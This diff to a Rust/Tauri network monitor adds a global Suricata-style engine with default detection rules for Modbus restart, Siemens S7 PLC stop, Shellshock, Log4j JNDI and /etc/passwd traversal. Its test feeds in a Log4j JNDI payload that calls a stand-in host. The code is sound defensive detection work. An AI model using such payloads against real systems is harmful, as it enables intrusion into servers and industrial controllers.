@@ -1173,6 +1173,86 @@ impl SuricataIndustrialEngine {
     }
 }
 
+/// Suricata DSL 规则引擎运行时可观测状态快照
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct SuricataDslMetrics {
+    pub total_rules: usize,
+    pub total_packets_scanned: u64,
+    pub total_hits: u64,
+    pub recent_hits: Vec<ThreatHit>,
+}
+
+pub struct GlobalSuricataState {
+    pub engine: SuricataIndustrialEngine,
+    pub total_packets_scanned: u64,
+    pub total_hits: u64,
+    pub recent_hits: Vec<ThreatHit>,
+}
+
+const DEFAULT_SURICATA_INDUSTRIAL_RULES: &str = r#"
+alert tcp any any -> any 502 (msg:"SURICATA Modbus Diagnostic/Force Restart (Subfunc 0x08)"; content:"|00 00|"; offset:2; depth:2; byte_test:1,=,8,7; sid:900101; rev:1; metadata:severity critical;)
+alert tcp any any -> any 102 (msg:"SURICATA Siemens S7 Stop PLC Control (0x29)"; content:"|32 01|"; content:"|29|"; sid:900102; rev:1; metadata:severity critical;)
+alert tcp any any -> any any (msg:"SURICATA Shellshock Bash Exploitation"; content:"() { :;"; sid:900103; rev:1; metadata:severity critical;)
+alert tcp any any -> any any (msg:"SURICATA Log4j JNDI Lookup Injection"; content:"${jndi:"; nocase; sid:900104; rev:1; metadata:severity critical;)
+alert tcp any any -> any any (msg:"SURICATA Path Traversal /etc/passwd"; content:"../"; content:"etc/passwd"; distance:0; sid:900105; rev:1; metadata:severity high;)
+"#;
+
+pub static GLOBAL_SURICATA_ENGINE: once_cell::sync::Lazy<std::sync::Mutex<GlobalSuricataState>> =
+    once_cell::sync::Lazy::new(|| {
+        let mut engine = SuricataIndustrialEngine::new();
+        let _ = engine.load_rules_from_text(DEFAULT_SURICATA_INDUSTRIAL_RULES);
+        std::sync::Mutex::new(GlobalSuricataState {
+            engine,
+            total_packets_scanned: 0,
+            total_hits: 0,
+            recent_hits: Vec::new(),
+        })
+    });
+
+/// 供抓包主流水线调用：并发运行 Suricata 两阶段工业 DSL 引擎
+pub fn scan_with_global_suricata(payload: &[u8], is_to_server: bool) -> Vec<ThreatHit> {
+    if payload.is_empty() {
+        return Vec::new();
+    }
+    let mut state = match GLOBAL_SURICATA_ENGINE.try_lock() {
+        Ok(g) => g,
+        Err(_) => return Vec::new(),
+    };
+    state.total_packets_scanned += 1;
+    let hits = state.engine.scan_payload(payload, is_to_server);
+    if !hits.is_empty() {
+        state.total_hits += hits.len() as u64;
+        for h in hits.iter() {
+            state.recent_hits.insert(0, h.clone());
+        }
+        if state.recent_hits.len() > 100 {
+            state.recent_hits.truncate(100);
+        }
+    }
+    hits
+}
+
+#[tauri::command]
+pub fn get_suricata_dsl_metrics_cmd() -> Result<SuricataDslMetrics, String> {
+    let state = GLOBAL_SURICATA_ENGINE
+        .lock()
+        .map_err(|e| format!("Suricata DSL 引擎锁定失败: {}", e))?;
+    Ok(SuricataDslMetrics {
+        total_rules: state.engine.rules.len(),
+        total_packets_scanned: state.total_packets_scanned,
+        total_hits: state.total_hits,
+        recent_hits: state.recent_hits.clone(),
+    })
+}
+
+#[tauri::command]
+pub fn load_suricata_dsl_rules_cmd(rules_text: String) -> Result<usize, String> {
+    let mut state = GLOBAL_SURICATA_ENGINE
+        .lock()
+        .map_err(|e| format!("Suricata DSL 引擎锁定失败: {}", e))?;
+    state.engine.load_rules_from_text(&rules_text)
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -1321,5 +1401,23 @@ mod tests {
         let hits = engine.scan_payload(&large_payload, true);
         assert_eq!(hits.len(), 1, "超大 100KB 载荷必须精准命中");
         assert_eq!(hits[0].signature_id, 2020099);
+    }
+
+    #[test]
+    fn test_global_suricata_engine_scan_hits_and_empty_defense() {
+        // 1. 零载荷防御
+        assert!(scan_with_global_suricata(&[], true).is_empty());
+
+        // 2. 真实内置规则命中 (Log4j & Modbus 0x08 诊断功能码)
+        let log4j_hits = scan_with_global_suricata(b"GET /?x=${jndi:ldap://evil.test/a} HTTP/1.1", true);
+        assert!(log4j_hits.iter().any(|h| h.signature_id == 900104));
+
+        let modbus_diag = [0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x01, 0x08, 0x00, 0x04, 0x00, 0x00];
+        let mb_hits = scan_with_global_suricata(&modbus_diag, true);
+        assert!(mb_hits.iter().any(|h| h.signature_id == 900101));
+
+        let metrics = get_suricata_dsl_metrics_cmd().unwrap();
+        assert!(metrics.total_rules >= 5);
+        assert!(metrics.total_hits >= 2);
     }
 }
